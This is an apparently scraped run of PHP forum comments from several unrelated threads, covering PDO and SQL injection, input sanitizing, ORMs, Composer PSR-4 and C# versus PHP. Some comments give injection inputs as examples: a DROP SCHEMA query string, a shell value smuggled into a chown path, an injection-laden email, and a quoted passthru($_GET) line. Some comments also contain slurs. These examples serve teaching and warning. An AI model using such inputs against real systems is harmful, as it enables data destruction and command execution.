I'd be happy to have a discussion about that plugin. I've received work all over the globe for that work, and its being used actively by Apple, the UN and USA.gov. Is it perfect? Hell no. I wrote about that in the introduction to my [new book](https://leanpub.com/build-apis-you-wont-hate), so don't worry - you don't need to buy it. But before you fly back with another angry response, what packages have you released that are still actively used by large corporations and international organizations 6 years after its original release? Is it maybe 0? If it's more than 0 then is it still something you are proud of, or have you learned to improve it since then? I would also point out that assuming 25 year old CTO Phil doesn't know a god damn thing because you were using some code that 18 yr old Junior Developer Phil wrote for a framework that he has since publicly denounced is probably rather unreasonable, and potentially moronic.
This bit http://d.pr/i/Pz2X
+1 If you need to go further than simply adding domains and sites etc to your server, Webmin allows you to get down to the nitty gritty details like Postfix configuration to name just one.
See my article above. I'll be happy to give you a free copy of my new API book, as it sounds like you'd be able to provide some no-bullshit feedback. But again, let's not assume I'm still the same developer that wrote that plugin 6 years ago.
What part of "'decoupled *from the framework*' vs 'decoupled *from each other*'" gives you that impression? Do you feel the same way about the use of the terms "standalone" and "independent"?
The popularity of Laravel will certainly not hurt it, as long as the fanboyism and isolationism by various third-parties is not furthered. I'm mostly hoping people will eventually calm down (the sooner the better) and remember it's just PHP, and code their packages as such.
Didn't know you were only 25. I've been programming for longer than you've been alive. I don't know how I feel about that.
Mhm, definitely a good idea. While BCMath is definitely faster than pure PHP, GMP is still much much faster than BCMath.
I believe I've [already read it](http://i.imgur.com/WDME0.jpg).
No, if you count all applications I'd still be *very* surprised if PHP wasn't more extensively used than Python. Perhaps not today, but PHP was astronomically more popular than Python for a very long time. That said, it doesn't make either a better language but your comment about this subreddit seems quite childish.
Can't they finally remove mysql_... Its not like anybody who uses mysql instead of PDO actually will update php to 5.5 let alone 5.5.x
Oh ok, I was trying to have a discussion like a normal human being but if you're just going to be a cunt about it...
I've been programming for 2/3rds of my life, so I'm probably not too far behind. But yeah, it's a little crazy that I went from Junior Dev to CTO in 7 years. It's certainly not standard, but open-source contributions and reputations generally accelerate the fuck out of things, as long as you can prove that you know what you're talking about.
Yeah im over half way, that's catching up. :D
Great work on this and the other TLS related improvements. 5.6 is shaping up to look excellent. 
Kinda sorta new at PHP. I've only used MySQL, but am aware of sanitation concepts. Why would I want to switch to PDO?
There are multiple reasons. 1 is that you don't need to worry about escaping special characters. So the string " hrtfge\`err" would work just fine despite containing the backtick( ` ) character (which has a special meaning in sql). This makes code more maintable. For me the main reason is this: Imagine you have a block of code like this. $sql = "SELECT * FROM table WHERE id =" . $_GET['id']; $connection = mysql_connect('localhost', 'mysql_user', 'mysql_password'); $result = mysql_query($connection, $sql); Imagine if the somebody trying to hack your system went to the url for this page but their $_GET variable was **"1; DROP SCHEMA mydatabase;"** Well now all of the sudden they've executed an additional query without your knowledge. This is an example of an sql injection and it is prevented by using paramaterized queries (prepared statements). The regular mysql extension doesn't support paramaterized queries, but both mysqli and PDO do. (Also they don't need to go to the actual url in a broswer to do this. They can just curl the url with whatever paramaters they want for their $_GET and $_POST. Curl basically just means hitting a url like a browser would, but it can be executed from a script. [You can learn more about it here](http://php.net/curl).) Here's a quick example using mysqli $stmt = $mysqli-&gt;prepare("INSERT INTO users (name, age) VALUES (?,?)"); $stmt-&gt;bind_param('si','one',1); $stmt-&gt;execute(); The 'si' is for string an integer (first paramater is a string, second is an integer). The second and third paramater was the values that 'replace' the two question marks. Lastly is that a query that gets executed a bunch of times is more efficiently handled by the sql engine as a prepared statement. 
Oh cool, I didn't even know this was a thing. Thanks for sharing.
I'd have a go at answering this if the system was coded in PHP, but it's not. But I'd assume that the code is safe if they are releasing it. I guess you could also kill off some of the things that are able to be run from the panel
FYI, I read the apology /u/audaxxx offered as a pretty genuine one, though I can certainly see how it could be taken the wrong way.
Security isn't the problem - as I'm going to be writing my own code for it, but I wanted to see examples of people that have done this before. I'm intrigued to see how they went about it. It's only a side-project for me to get me to grips with Laravel. I needed something big to explore Laravel properly and something fairly straight-forward so that I don't waste a lot of time! 
http://www.phptherightway.com/ perhaps?
Ah, yeah, I took it more of like... they just didn't realize the conversation was taking place in the webdev niche, and were thinking more broadly... unless I'm missing something here! I know there's contention between languages sometimes, but I'm *way* too much of a newbie to recognize when it's happening.
Oh man thanks for this dude! I really like the code layout for this. So I've actually been using mysqli functions like mysqli_fetch_assoc, query, connect and so on. Is that the same thing as PDO? What's a good place to continue my studies on PDO?
Honestly, just use it. Mess around with it. Whenever you need to figure out what something does try to refering to the php.net/docs.php‎. I use mysqli because I found it easier, and its more or less the same thing as PDO (just with different syntax really). PDO stands for "php data objects" so it really just means the driver that can turn entrees from a database into a php object (arrays/associative arrays are technically objects). Rule of thumb is anything that could come from the client should be paramaterized (insert values, where clauses). I'd also be happy to answer any questions you have now or sometime later if you find yourself not understanding something. 
Keep in mind, vBulletin staff does NOT check __third party plugins__ for security issues. Third party plugins security are managed by their own respective developers, and if the developer is doing something derpy, the onus of auditing it is the community users who choose to download and use it. vBulletin support team also do not review/support/maintain third party plugins on support tickets. If you've got third party plugin, the response we give is always to disable them; if you've got modified template as result of the plugin, the response we give is always to revert them or use a new style with default templates. Once it is functional again, our advise is always to individually re-enable your plugins to find the one that is causing problem. The onus of restoring a defaced site is on the forum owner themselves, and the onus of maintaining third party plugins is always the developer of their own. We do not monitor/audit third party plugins. Source: I am Andy Huang, a former vBulletin developer before Internet Brands took over; and that was never part of our job. Note: I'm not saying the third party developer did the right thing with the choice of code. I'm saying vBulletin is not responsible for code produced by third party developers per suggested.
Don't output it?
 display: none;
LOL
[What's the best method for sanitizing user input with PHP? (StackOverflow)](http://stackoverflow.com/a/130323/232947) 
Yes although I might throw in an `array_map` with `intval`.
Piss off faggot Aura is fine
Honestly, Wordpress is made of derp. It is derp central. It is where derp is made, from derp taken from the River Derp, forged deep within the bowels of Mount Herp. Not wanting to derp in Wordpress is like wanting to take a swim, but not wanting to get wet. That said, if you're just looking for general information, take a look at [PHP The Right Way](http://www.phptherightway.com) or get to really know Wordpress deeply and intimately. You know... so you can do the opposite.
I would use Code Igniter personally but most people have moved on from it I think. Personally though if you like redbean you will love CI with datamapper installed.
I wouldn't change jobs for a server-side language. I'm primarily a Javascript developer. That's not really a solution anyway. A better one would be to promote PHP to the organization and show them over time how it could be better than their current solution. Tiny ripples can lead to great waves and all.
Maybe not an intval if mixed values...but if just ints or floats then sure 
Web developer here. I get so many root level privileges sent to me. I don't want that sort of responsibility. Get it away from me!
&gt;Apache never dies What do you mean by this? I've had things break Apache. Couldn't stop it, couldn't start it, etc. &gt;C# has Visual Studio (MonoDevelop won't work for certain website configurations), while PHP has NetBeans, PHPStorm, Sublime Text, Eclipse, and even Notepad if you're so inclined. None of those IDEs are as good as Visual Studio in my opinion. C# is actually a really nice language to work with. Do you have a system admin or someone doing devops? Maybe that guy is your problem. When MS stuff is run correctly, it generally runs like a champ. The biggest problem I've seen is that people don't know how to administer a Windows box.
Andy "Bunnie" Hwang?
&gt; Maybe not an intval if mixed values... I think that's a pretty obvious given, but the example only used numbers, and intval on floats is not a good idea if you care about the digits after the decimal.
I've done the same journey as you; PHP -&gt; VB.NET / C# (webforms) and I really would like to switch back. OMG so much shit there is in the MS world and webforms could very well be the worst shit of it all. The only (?) nice thing is the C# syntax. As an old C++ / Java developer I can really appreciate everything that they have done right in C#. One problem with switching back is that working with FOSS-environments does not seem to pay as much as "enterprise"-environments.
I've never developed professionally with C#, so I can't really disparage your rant against the server stack used with asp.net, but I can say the language itself is a work beauty. If PHP evolved, C# was meticulously designed, and it shows. While the development ecosystem may not be as rich, the language itself is fantastic.
I think he meant root as in directory root, not super user root, since he's cd'ing and pwd'ing. 
I've never had a problem with Apache quitting or running a zombie thread. I've especially never had to reboot my machine if I made a mistake in the programming. When IIS decides to die it prevents VS from quitting. Sublime has features that surpass VS in many ways. It may not be as robust in certain areas, but it does well what it needs to. The others have their strong points as well as similarities to eachother and VS. None of them are 1.4GB or more to download. Eclipse is only around 200MB. I agree that C# as a language is fine, if not a little more strict than I'd prefer (I'm a dynamic typing guy, not static typing). This post wasn't about the language. I have no problem with the staff. They're great people and knowledgeable. &gt; The biggest problem I've seen is that people don't know how to administer a Windows box. Is there some secret that people should know? I was an Active Directory developer for a time and I have a degree in computer networking focusing on Active Directory and Windows. Windows itself doesn't seem to be at fault here.
Backwards compatibility has always been the reason against changing or removing certain features regardless of how unsafe they are
True to both points 
wtf, if i was reviewing some code to look for something exploitable, i'd grep for *eval(* first. Although I guess checking the sql queries is also up there.
I had to work on a codebase that had that... *shudders*. The worst part was that i didn't get the time to fix stuff like that.
I'm by all no means an expert on the subject, but isn't using a Service Locator hard to unit test? If so what are the thoughts on writing tests for the controllers?
What combination of bad input and usage of the array could cause an issue here?
/r/lolphp
Absolutely. Controllers are the very definition of functions. They take inputs (requests and dependencies) and produce outputs (responses). The only reason they're even instantiable in most frameworks is probably to make the code that dispatches more testable by making them mockable. Constructor injection gives controllers state, where they had none implicitly, and that leads to the drawbacks noted (bloat/overhead).
I tried this out on one of my alpha packages, it seems like Packagist itself doesn't yet support PSR-4, I'm sure it's not far away though :)
Only root user would have privileges to chown the root dir
I personally think *unit* testing a controller is a waste of time. A unit test should be against a single responsibility method. All the controller really does is initialise all the unit tested components together. If you wanted to test it at all, you'd want *functional / acceptance* testing which looks at the bigger picture.
You leave the keys and wallet on top of your corvette in New Orleans, it's bound to be stolen 
The change dir command would be something like this (for a malicious): $dir = "/opt/blah/ &amp;&amp; cd /" chown -R deploy:www-data /$dir/* But going back and re-reading, he said omitting $dir, so you're right :) its Friday night and I'm snowed in lol
Without more information about how you're rendering the page to begin with, there's no way anyone can give you a decent answer.
PHP through something like Phalcon is probably faster than C# if you're seeing comparable results between C# and PHP now.
Yes escapes special characters. I'm not great at explaining it or understand exactly what happens, but basically it prevents any additional sql that could have been stored in the variable from be parsed as sql and instead only parses it as a value. 
&gt; What do you mean by this? I've had things break Apache. Couldn't stop it, couldn't start it, etc. Sounds like configuration problems. If configured according to the relatively simple instructions, Apache is very reliable. Obviously anything will break if you abuse it sufficiently. More interesting is how well it performs if you treat it with basic care.
This is always how I've always provided route parameters as well, it makes the most sense that they are available as part of the input object. I never liked Cake or Codeigniter's approach of passing those parameters into the controller method arguments. That always felt inconsistent to me.
Because users do a large number of stupid, useless, and even malicious things with the data they provide. Leading and trailing whitespace is a waste of storage and can cause display and/or matching problems. It's almost always better to remove it. Broken Unicode sequences are never helpful and can cause all sorts of hard-to-debug problems, you always want to get rid of them. Extremely long inputs where short inputs are expected, might as well get lopped or rejected early rather than wasting a bunch of RAM and CPU time churning through them. When someone sends you a 10-megabyte first name, you want to have filtered that shit. In many contexts there is nothing productive that can come of characters like &lt; and \, so why bother keeping them? Sure you can escape them later, but the only reason someone suggested their email address was bob@gmail.com\',admin=\'1 was to mess with you. One day a contractor is going to be migrating your database or something and it's going to bite you in the ass.
I can see the argument for dealing with whitespace and Unicode, but surely long inputs are a *validation*, not filtering, issue? &gt;In many contexts there is nothing productive that can come of characters like &lt; and \, so why bother keeping them? Because mangling user data unnecessarily just pisses of users. It also looks really unprofessional, sometimes. &gt;the only reason someone suggested their email address was bob@gmail.com\',admin=\'1 was to mess with you. Maybe, but bear in mind that there are a lot of valid email addresses with backslashes and quote marks in them. &gt;One day a contractor is going to be migrating your database or something and it's going to bite you in the ass. Again, trust your programmers.
Lambda. echo $users-&gt;map($user =&gt; $user-&gt;name)-&gt;join(", ");
I used to worry about this too, but at the end of the day, application-level controllers simply are not meant to be re-usable service code objects. That is, they aren't providing a service to any other part of your application (or anyone else's application), thus unit testing them is pretty much pointless. Further, if you have so much logic in a controller method that you feel it should be given a unit test, you may want to consider delegating some of that logic to a domain-level manager of some kind. 
C# and what? C# and Web Forms is slow unless you really know what you are doing. C# and MVC is fast... unless you weigh it down with a lot of bloat like DI frameworks or poorly designed ORMs. C# and Web Pages will feel like PHP because it doesn't need to be compiled.
It's really hard to tell the difference between a bad language, framework, stack, etc, and people badly using a good one. I have never worked extensively with Microsoft's stack for web development. I've worked with Visual Studio a bit when I was frontin' for an ASP.NET backend. It was pretty awful, but that could just as easily be inexperience. Still, I have to say, I honestly don't understand why people use these MS tools for web development. Microsoft have gone out of their way for more than **a decade** to make mind-numbingly shithouse web tools that blatantly violate standards and best practises. From Frontpage to their current .NET MVC, Microsoft just have *no fucking clue* about the internet. I swear to God I don't understand why people still tolerate them. The last place I worked was a MS shop, and they were constantly doing mindlessly stupid things because that was what Microsoft said to do and made it easy. That it violated every principle of web standards and practises, and resulted in a substandard product was either secondary or lower. I refer to things like including old versions of jquery, dumping large amounts of uncachable &lt;script&gt; tags into the page, etc. Developers should be expecting more.
 header, footer { display: none; } Seriously, you're going to need to be more specific. What are you trying to do and why?
&gt; Imagine if the somebody trying to hack your system went to the url for this page but their $_GET variable was "1; DROP SCHEMA mydatabase;" Well now all of the sudden they've executed an additional query without your knowledge. This actually won't happen. mysql_query() sends a unique query (multiple queries are not supported) to the currently active database on the server that's associated with the specified link_identifier.
In my experience the issue is that their developers don't demand more because their developers have a blinkered view on the world. The place I currently work at has this attitude. They wont use grunt or bower (wrapped up in yeoman), because they can use the bundling engine and nuget - despite this objectively providing a sub standard experience. they faught for weeks against using lessc to compile LESS, because "DOTLESS" was a thing that worked in visual studio - in the end, the fact that DOTLESS didn't compile like for like against lessc, and thus twitter bootstrap fell in a heap when built, was the only reason they begrudgingly decided to do it properly. Or my favorite, trying their level best to bring C# idioms to javascript - instead of just writing javascript. Leading to the most rediculously complex and slow running javascript I ever saw (and no, this wasn't using typescript - this was a "framework" built by them on top of javascript/jquery to make them feel more at home) I'm sure that there are some great .NET devs out there who do things right - there has to be. There are far to many good things built on the technology stack for this not to be the case. But Microsoft have done such a great job of lowering the barrier of entry to stuff with their ecosystem and tool chain that there is in my experience at least a culture of people who seem to think that knowing C# and the microsoft tools is enough to get them by. They are concerned with delivering solutions irrespective of elegance and businesses (especially places where software development isn't their core business) reward this behavior. From where I sit the technology stack looks very capable. The language (C# here, not VB) is beautiful and the integrations with all sorts of technology common in the enterprise makes for a highly productive team. I project manage both .NET and PHP projects though, and the .NET devs are, in my experience at least, the problem...mostly because of reasons stated above. As for the OP - i've never seen so many problems. VS2010 was unstable as all hell, but 2012 seems like a rock. Not sure what you are using lucene for but it would seem that is your biggest problem, not the .NET stack. As for performance, a well set up IIS server should run amply fast enough. The workflow *is* complete shit. The compile step, especially when coming from a "save, refresh" workflow like php is incredibly jarring. But I don't feel the rest of your complaints are warranted...
*PDO parameterized statements DO sanitize inputs.*
&gt; surely long inputs are a validation, not filtering, issue? Depends on the situation, I suppose. Where you are dealing with enumerated items there may not be an interface path for validation. In these cases the only reason it would come up is because someone is trying to screw with your site. &gt; Because mangling user data unnecessarily just pisses of users. It also looks really unprofessional, sometimes. Again, I am not interested in avoiding pissing off a user who is being deliberately difficult. Removing + from email addresses, stupid. Removing &lt; from usernames, not necessarily so stupid. &gt; bear in mind that there are a lot of valid email addresses with backslashes The fact that it's technically within spec for the user part (you'll notice my example had it in the hostname part, where it's not valid) doesn't mean that it happens "a lot". In 30 years of dealing with internet email I've never seen one. &gt; Again, trust your programmers. There's a difference between trusting your programmers, and leaving land mines lying around the office.
I was exactly like you 8months ago, stopped freelancer life (with php,...) and applied big media company, joined IT staff. Our site was developed 5 years ago with c#, along with many many shit services on windows background. First, i was too bad, server slow, down, return funny code, bla bla.... But when i tried to spend more time on c#, .net stuffs, iis, ... I realized this thing i called shit, was very good system. Just because i need to think like .net developer, not php. Trust me, to be honest, i still like php, less config, works fine, ... But for .net applications, when you understand its, config correctly, everything will be fast as hell
If you know during a request you will use both, why not grab all males and using PHP sort out the ages?
Really, the only way to DRY this up (in any way) is with a query writing library and some functional-style functions that return a partially built query.
I am being serious. It's a trade-off. Two queries for a set of data and a subset of it, or one query and a sort? Whether it matters for performance depends a lot on the amount of data returned in the query (among other factors). 
Your phrase "*really* slow" signifies a major performance hit and that is certainly not the case. I ran some quick tests on my local machine and found a negligible difference (if any) when using the error control operator. Some results: Slightly slower: http://codepad.org/H8UAFZaE Slightly faster: http://codepad.org/WIwgchb4 I wouldn't recommend overuse, mainly because it makes debugging a hassle. This is off-topic from error control operators, but - for what it's worth - I hate dealing with SimpleXML and tend to use the json_encode/json_decode trick to convert SimpleXMLElement trees into a PHP array. That may help you in some way.
Which can be said about IIS as well... EDIT: I should probably preface this with saying a lot of my experience on all these different servers were on intranet business applications. Very busy websites may be different for all I know.
I don't think you understand the question. The questions was about the a part of the query getting duplicated between getAllMaleUsers() and getAllMaleUsersAboveAge($age = 45).
What errors did you see?
It's deprecated.
PHP cannot be blamed because lots of people using it are potentially shitty at security. But this is the sort of reason PHP The Right Way was set up, to offer more secure advice than the average durpblog.
ELI5 PSR-X ?
Just want to throw some caution in the wind, beware of using 'free' and 'cool' server control panels that have no real history of security. 
You specifically reference Doctrine's Criteria object, but this seems like a solid case for pretty much any ORM. In my experience it's not necessarily the simple queries like this that add up, but the joins and very slight conditional changes. Using an ORM seems to simplify that case. Taking your example. return Users::where('gender', '=', 'male'); in one case, and return Users::where('gender', '=', 'male')-&gt;where('age', '&gt;', '45'); Is entirely reasonable. The reason I think this is beneficial still (even though it's not apparently any shorter) is that your query probably wouldn't actually be what was shown. People tend to illustrate with trivial examples that don't really show real-world usage. It would probably really be more like the following SELECT u.*, g.name AS gender, us.status FROM users AS u LEFT JOIN genders AS g ON g.id = u.gender_id LEFT JOIN user_status AS us.id = u.user_status_id WHERE u.gender_id = 1 Queries like this can grow to be very long, but an ORM keeps them manageable by keeping the relationship internally. The code I wrote above would be unchanged by this actual use. An ORM like Laravel's Eloquent (and presumably most others) also support "scopes", meaning something like this is entirely doable. return Users::where()-&gt;gender('male')-&gt;ageOver(45)-&gt;isActive()-&gt;get(); Highly readable, highly manageable. 
Hardly the only way. This seems like an ideal case for an ORM.
Oh right, I know that. But it's also been deprecated for a while . My reasoning is that since overlap beteeen devs who use the most recent version of php and who use the mysql extension is so small that just removing it would have very few repercussions. Also I'm a big fan of your blog. 
Sadly, yes. They are being serious. Also you forgot what I thought the most important thing is: 3) have a bunch of extra code that does something trivial and doesn't need to be there. 
No, PHP can't be blamed for this, but when you say "PHP is as secure" or something like that, what specifically you're talking about is a little ambiguous. There is more to the language than the codez. There's also the ecosystem, the community, its legacy, etc. I'm not saying this is a critical flaw of PHP, I'm just saying that when you talk about "PHP" it pays to be aware that this means different things to different people.
The problem with ORM is that sometimes you need a query to be optimized and need it to be exactly in a certain way for achieving an acceptable level of performance.
PSR is a standard for automatically loading classes. So you have a folder that's has your classes arranged in a PSR-compliant style (For PSR-0, it's src/Vendor/Component/classname.php (where Vendor is the name of the person/company that developed it, and Component is the name of the overarching "project" that that class is a part of)), and in your core PHP file (which is included/required by every single one of your other pages) you set up a "class autoloader method" (google for those, there are lots of them, I think PHP5 actually comes with one built in now). Then, from that moment on, you never have to "require_once "../../../lib/classes/blogpost.php" again. You just do $BlogPost = new BlogPost(), and PHP will automatically use the autoloader function and the predictable file naming structure to go find exactly where that class and all of its data is. In reference to this exact Reddit post: Composer used to only support PSR-0, which enforces the src/Vendor/Component/classname.php structure. But most of the time, a composer package is only one component by one vendor, so it's 2 unnecessary nested folders. This new update allows developers to use the PSR-4 standard, which is just src/classname.php, and the Vendor/Component information will be automatically fetched from the composer package details.
An ORM is basically the same thing, with some more "gloss and lipstick". The start of a good ORM is an efficient query writer.
What and where is "it". I've uploaded my psr-4 autoloader type recently and not had complaints in the packagist emails about it. Your local composer install will of course need to be updated. Run `$ composer validate` when it's updated to see if your composer.json is up to scratch.
Fair, but there is bad advice in any language. The article is trying to point out that PHP is no less secure than any other language and at a factual level talking about languages that is true. The general security mindedness of the community is probably lower, and it's good that things like the recent PHP 5.6 TLS updates are happening to drag the community up regardless of their skill level. :)
The error was displayed in a pop-up on the packagist site after adding a new package that was using a psr-4 autoloader. Perhaps it's relevant that it was a new package. Local composer install has been updated and everything appeared fine on that end, I could update my deps and generate a new autoloader using psr-4 without any issues. I've got another package to add, I'll see if I can reproduce it. Edit: turns out I did get an email as well: [Composer\Repository\InvalidRepositoryException]: Some branches contained invalid data and were discarded, it is advised to review the log and fix any issues present in branches Reading composer.json of recoil/recoil (develop) Importing branch develop (dev-develop) Skipped branch develop, Invalid package information: autoload : invalid value (psr-4), must be one of psr-0, classmap, files Edit again: I tried updating the same package to PSR-4 again now that it's already in the registry - same error. 'composer validate' passes. Once more: I asked about this on #composer IRC channel, apparently this is to be expected atm. Seems fair enough given the recommendation to wait a while before updating our packages. https://github.com/composer/packagist/issues/373
define "acceptable level of performance"? and explain precisely how a query generated by an ORM prevents you from indexing columns like a grownup? The problem with an ORM indeed... 
Is running multiple httpd processes on the same server on different ports an option?
You're wrong, it really is a solution. If you're not happy where you are that's something you need to fix. Sitting around bitching that you hate X and wish you were using Y is not a solution.
"acceptable level of performance" is what ever that is acceptable by the client or the end user. &gt;and explain precisely how a query generated by an ORM prevents you from indexing columns like a grownup? Your response makes the naive assumption that just by using proper indexing all your queries magically becomes fast. But this is only true in cases of simple queries, where the default execution plan can/will use the indexes. In other cases where really complex queries are involved, you will have to tweak or restructure the queries until you reach the performance and scalability you need. And I think any decent ORM will automatically index foreign key fields automatically. I know Doctrine does. kthx. 
This approach is very unfriendly to "automation". If each controller action depends on different stuff you app must be very verbose or you'd need to heavily use reflection to inject your arguments... which are actually dependencies... My solution would be to have the controller what we currently use as action. That is to have one class per action (route handler) instead a class per controller which contains a list of actions. Something like &lt;?php namespace App; class UserProfileAction { // set your dependecies function setUserRepository(\UserRepository $users) { $this-&gt;userRepository = $users; } function execute($request, $response) { $user = $this-&gt;userRepository-&gt;find($request-&gt;get('id')); } } 
This is how this reads: &gt; I have never worked extensively with Microsoft's stack for web development, but man do I ever have strong opinions about stuff I know almost nothing about! 
"(in)Security" is such a broad and complicated topic that it is definetely everywhere. Whatever language and programs, the "enemy" is always there. Protocol/code/documentation/problem complexity, all kind of quirks related to some part of the "big picture", lack of time, bad practices, no rules for the bad guys to obey .. the list goes on and on. And things just may be more difficult than what they at first look like (password hashing for example). It takes quite a bit expertise and knowledge to get most of the things right. PHP is certainly improving on the security size in general. PHP 5.5 password hashing functions, PHP 5.6 TLS peer verification... Also, the core level improvements agains buffer overflows etc. is a great thing. The PHP community is maturing and projects like phptherightway.com, security related presentations, web sites educating about security, sec related conference talks and so on - this is how things improve on the specific community and language side.
(Sorry for the late reply) Im not sure how practical it is to mount a timing leak attack agains CSRF system, but maybe it could do for the sake of example. "User submitted token comparison" would be a good example, I guess.
A bad one.
1. The second set of data is a subset of the first, so if you query for the first set, and do the filtering in PHP, it will not be more rows. On the other hand, if you request the first set from the database, and then request the second set from the database too (which is what OP's example does), **that** will return more rows, because the first set already includes the second. 2. His solution adds workload on the PHP side, OP's one adds workload on the database side (you are issuing two queries instead of one). It's a trade off. You did not think this through did you?
"framework agnostic packages" the gist, take away, and should be the new campaign in PHP development.
Still better than the echo passthru($_GET["q"]) I found =[
$_COOKIE, not $_SESSION?
vagrant could be a possibility
Cillosis (the guy you replied to) made the assumption that they are executed in the same request, and he replied with that in mind.
1. Evangelize the importance of offline jobs. Sending email, requesting webhooks, processing payments, those processes can all be done in the background to optimize for responsiveness. 2. Once management sees the benefits, install and integrate a job queue. Preferably a hyped one. Make every process a background process. 3. Start writing your job workers in JavaScript with Node.js. If management asks, say it's frontend code. If management asks again, say that Node.js is web scale.
Set it up so its only accessible via vpn / locally?
ok, here is one specific case. I have a query of the form select * from table1 as t1 join table2 as t2 on t2.entity_id =t1.id join table3 as t3 on t3.user_id = t2.user_id where t1.key_id = 4 ok? Now in as a part of another operation, I need to join a new table to the result of the above query. I mean, I need to do something like select * from table1 as t1 join table2 as t2 on t2.entity_id =t1.id join table3 as t3 on t3.user_id = t2.user_id join table4 as t4 on t4.department_id = t3.department_id or t4.organization_id = t2.organization_id where t1.key_id = 4 and t4.checkpoint_id = 10 You can see the logic of first query getting duplicated in the second one? right? It is this duplication I am trying to avoid. Can you please show my how this can be done using DBAL? Let me be more specific. I need a way so that any change made to the first query gets automatically propagated to the second query. You can spare me the string concatenated solutions. 
We managed a Drupal site we put together for a client last year. They contracted some muppets to create some new registration forms for them, as php dreamweaver scripts and plastered them all over the root folder of the site. The scripts were riddled with sql and eval injection, so I disabled them. The client was livid and took his site to another hoster. I restored all the scripts before handing over the zip files of the site and database. Good luck to them, and their personal medical details in the database. It is only a matter of time before they get heavily hacked. And no, I'm not telling you who they are. 
C# is a good language (from a language design point of view) its the OS/ CLR [Edit: CLR is not actually Bad, Just the OS] (which sucks in a big way (PS: I do have a MCITP Certification :-P)) and the ASP.NET framework is good but (its f*n HUGE (cant be a master in it any time soon))
PHP didn't even evolve, IMO. Evolution is survival of the fittest. PHP was instead hacked together, then hacked on top of, then hacked further, and further, and you end up with the mess you have today.
This would be much easier with PHP-FPM, you can spawn multiple instances/pools on different listening ports/sockets - each with isolated extension/module versions - then have nginx/apache pass PHP requests to the correct PHP-FPM worker pool for each virtual host. 
No, the two datasets are not for the same request.
Did you check the docs? I feel like I'm reading up homework. function base() { // $conn is omitted for clarity $qb = $conn-&gt;createQueryBuilder(); $qb-&gt;select('*') -&gt;from('table1', 't1') -&gt;innerJoin('t1', 'table2', 't2', 't2.entity_id = t1.id') // more inner joins -&gt;where('t1.key_id = 4'); return $qb; } function concrete1() { return base()-&gt;getSQL(); } function concrete2() { $qb = base(); $qb-&gt;innerJoin('t3', 'table4', 't4', 't4.organiziation_id = t3.department_id or t4.organization_id = t2.organization_id') // ... $qb-&gt;andWhere('t4.checkpoint_id = 10'); return $qb-&gt;getSQL(); } 
Yeah ok, this wasn't expected but I am suggesting people make their "psr4" stuff in a branch, so it doesn't matter to packagist or anyone using it if there are problems for now. Getting tests passing is more important than making packagist happy.
Or here's an even better advice: Stop using mysql_* or mysqli_* functions and use PDO instead! It's in my opinion more secure and less annyoing. You don't have to use mysql_real_escape_string() on every $_GET[], $_POST[] or $_REQUEST[] var anymore and as far as I know you won't have any formatting errors. But I agree with your opinion of executing every query step by step.
Agreed! I tend to use PDO with parametrized queries. Not familar with the `mysqli_*` functions. *edit:* or you can use a framework with a database access layer. I think most or all widely used frameworks have one.
Or, in other words, evolved.
Quit your job. While you're at it, break up with your significant other. Trust me, I give life advice on reddit for a living. 
Like that &lt;?php $mysqli = new mysqli('localhost', 'test', false, 'test'); if ($mysqli-&gt;connect_errno) { die('Connect Error: ' . $mysqli-&gt;connect_errno . PHP_EOL); } $query = 'UPDATE `numbers` SET `number` = 9 WHERE `number` = 2;'; $query .= 'UPDATE `letters` SET `letter` = "z" WHERE `letter` = "a";'; $mysqli-&gt;multi_query($query); if ($mysqli-&gt;errno) { die('SQL Error: ' . $mysqli-&gt;error . PHP_EOL); } while ($mysqli-&gt;next_result()) {;} $mysqli-&gt;close(); +1 /u/spin81's advice for both PDO and sequentional execution. And I hope you won't use `die` in production :)
Yep. Also no backups were being done, no version control, and the database... My god, the horror... the horror...
But you have omitted the where condition in the first query. I know you can add the where in the concrete1() function. But then it have to be added again in concrete2() function again causing duplication. I am surprised that no one is getting the point... 
&gt; And I hope you won't use die in production :) +1 good point!
No. PHP was designed, but badly.
&gt; use a framework with a database access layer. I would recommend [codeigniter](http://ellislab.com/codeigniter). Haven't worked with it yet, but a lot of my friends do.
So add it to base(), if the where clause needs to be present in both queries. I edited the answer. &gt;I am surprised that no one is getting the point... Well me too, dude you can't put 1+1 together?
Not familiar with many frameworks, but I've used CodeIgniter before; it uses ActiveRecord to handle database stuff. It's certainly a good framework! I'm currently checking out [Laravel](http://laravel.com/). Looks awesome so far, it's more popular than CI right now and I like how they do things. Their database layer seems a bit more flexible, but I haven't really been able to do much with Laravel yet so I'm not yet sure about that.
Ok. It was stupid of me to miss that ) but, Instead of adding a where condition, what if you want to add a condition to -&gt;innerJoin('t1', 'table2', 't2', 't2.entity_id = t1.id') so that it becomes -&gt;innerJoin('t1', 'table2', 't2', 't2.entity_id = t1.id and t2.count &gt; 20') Can you make that change to the object returned by the base? The point being missed is that there are many places an sql can contain logic. And not always it can be modified by appending additional constructs. So what I am looking for is a way to somehow extend/modify arbitrary parts of a query. 
"The true problem with PHP lies in the community" The language is actually designed fairly well considering the last 5 years of improvement, its easier then using anything else. As a web language it is probably the easiest to use, and certainly powerful enough to run wikipedia, yahoo and facebook backends. If you say anything about security I'm gonna laugh at how much you dont understand programming 
&gt; designed fairly well It certainly isn't. It is useful and can be productive, but by no means is it well-designed. Heck, until sometime around 4/5, there were built-in features enabled by default which promoted terrible security practices (magic quotes and register globals, for example). Though these are the least of my problems with the language. Its function naming is inconsistent, its function parameter ordering is inconsistent, its type juggling is nonsensical at times, among other things.
You can use $parts = getQueryPart('join'), remove the join from the array that you want to modify, add the remaning ones back with add('join', $parts), and issue a different innerJoin(). You keep changing the question when presented with a solution, and then act surprised when people can't mindread you.
&gt; Who doesnt use an IDE theses days? Function parameter inconsistencies? Nah man, you just dont know how to use it (IDE or PHP?). A language which makes you need an IDE to remember the order of arguments because they're completely unpredictable is a poorly designed language. A language which, for the same reason, has code which is difficult to understand without an IDE is a poorly designed language. &gt;If PHP is insecure its because your coding wrong. Of course, but PHP used to encourage certain terrible security practises. &gt;Quite simply, PHP is the easiest to use, fastest to develop with, and the easiest to deploy under many environments. I'll take that over strict typing any day. That's true, and I agree. It's the reason I like using the language. &gt;Its funny cus everything your regurgitating is just anti-php talking points. None of it is a game breaker, and every language has its quirks. That's also true. PHP has certain significant flaws, mind you, and I don't ignore them just because I like the language.
http://www.doctrine-project.org/api/dbal/2.2/class-Doctrine.DBAL.Query.QueryBuilder.html
I thought that might be the case. I tend to use jQuery's text() for sanitizing out HTML.
